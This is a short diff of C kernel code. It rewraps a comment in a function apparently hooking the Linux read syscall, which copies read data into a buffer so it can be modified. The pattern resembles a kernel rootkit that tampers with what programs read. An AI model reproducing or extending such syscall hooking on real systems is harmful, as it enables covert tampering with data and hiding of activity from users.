@@ -65,7 +65,8 @@ asmlinkage long notrace read_hook(const struct pt_regs *regs) {
     }
     kbuf[ret] = '\0';
 
-    // Allocate a new buffer for the modified content, times 2, no other idea for the moment
+    // Allocate a new buffer for the modified content, times 2, no other idea for
+    // the moment
     char *out = kmalloc(ret * 2 + 1, GFP_KERNEL);
     if (!out) {
         kfree(kbuf);
